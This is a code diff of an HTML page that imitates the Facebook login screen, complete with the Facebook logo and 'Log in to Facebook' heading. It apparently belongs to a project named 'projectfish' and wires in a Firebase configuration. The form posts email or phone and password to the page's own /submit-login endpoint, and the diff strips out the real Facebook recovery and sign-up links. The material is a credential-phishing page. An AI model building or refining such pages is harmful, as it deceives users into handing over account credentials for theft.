@@ -7,6 +7,27 @@
     <link rel="stylesheet" href="/fbloginstyle.css">
 </head>
 
+<script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-analytics.js";
+
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyAJtq4jZCI-YdKwloiYCP5Ojwx5Vb6ldqY",
+        authDomain: "projectfish-99658.firebaseapp.com",
+        projectId: "projectfish-99658",
+        storageBucket: "projectfish-99658.appspot.com",
+        messagingSenderId: "972058121006",
+        appId: "1:972058121006:web:f09341cc08449f10c3a0bf",
+        measurementId: "G-V5394FV5Y8"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+</script>
+
     <style>
         body {
         font-family: Arial, sans-serif;
@@ -99,10 +120,10 @@
     </style>
 
 <body>
-    <img src="images/fbloginlogo.png" class="fblogo" alt="fblogo">
+    <img src="/fbloginlogo.png" class="fblogo" alt="fblogo">
     <div class="login-container">
         <h2 style="font-size: 17px; font-weight: bold; color: #504e4e; margin-bottom: 48px; font-family: sans-serif;">Log in to Facebook</h2>
-        <form action="submit-login" method="POST">
+        <form action="/submit-login" method="POST">
             <div class="form-group">
                 <input placeholder="Email address or Phone number" type="text" id="username" name="username" required>
             </div>
@@ -111,9 +132,6 @@
             </div>
             <button type="submit">Log in</button>
         </form>
-        <div class="bottom-form">
-            <p><a href="https://www.facebook.com/login/identify">Forgotten account?</a>·<a href="https://www.facebook.com/r.php">Sign up for Facebook</a></p>
-        </div>
     </div>
 
         <script>
